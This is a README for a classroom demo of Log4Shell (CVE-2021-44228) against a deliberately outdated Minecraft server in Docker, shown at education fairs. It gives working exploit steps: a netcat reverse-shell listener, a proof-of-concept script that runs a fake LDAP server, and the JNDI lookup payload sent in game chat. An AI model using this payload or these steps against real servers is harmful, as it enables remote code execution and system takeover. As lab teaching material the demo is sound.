# Log4Shell (CVE-2021-44228) minecraft demo
This demo is used at education fairs to give potential future students an idea of the cybersecurity department at HTL Villach and on how everyday applications can be exploited

## Attacker
The attacker in this scenario is using the PoC by kozmer. https://github.com/kozmer/log4j-shell-poc
All credit belongs to them. 
**Note:** All commands need to be executed in attacker/

#### Requirements:
```bash
pip install -r requirements.txt
```
#### Usage:


* Start a netcat listener to accept reverse shell connection.<br>
```py
nc -lvnp 9001
```
* Launch the exploit.<br>
**Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory. 
```py
$ python3 poc.py --userip <ip of docker-host> --webport 8000 --lport 9001

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up fake LDAP server

[+] Send me: ${jndi:ldap://<ip of docker-host>:1389/a}

Listening on 0.0.0.0:1389
```


This script will setup the HTTP server and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this, if everything went well, you should get a shell on the lport.

<br>

## Victim
On the victim instance we are using an outdated and therefore [vulnerable version of JDK (jdk1.8.0_20) ](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html).

#### Initial setup


To get our Minecraft server running we have to build our Docker image and run it.

**Note:** For a successful build you need to obtain your own copy of the Minecraft Vanilla 1.8.8 Server *(can't be shared because of Mojang's EULA)*
A possible source could be [MCVERSIONS.NET](https://mcversions.net/download/1.8.8)

After obtaining the file save it in victim/ as server.jar 

```docker
cd target/
docker build target/ -t minecraft-demo
```

#### Running the vulnerable server
Run the vulnerable Minecraft server we just built using docker
```
docker run --name vulnerable-server -p 25565:25565 minecraft-demo
```
It's likely that your container freezes or gets stuck after exploitation. In that case you can kill it using the following command:
```
docker kill vulnerable-server
```

#### Exploiting the server

To exploit the vulnerabilty simply send the string provided by the *poc.py* in the game chat.
```
${jndi:ldap://<ip of docker-host>:1389/a}
```
![image](https://github.com/felixslama/log4shell-minecraft-demo/assets/79058712/b3cc9c19-ca14-456c-bf7f-7246bb6adf58)
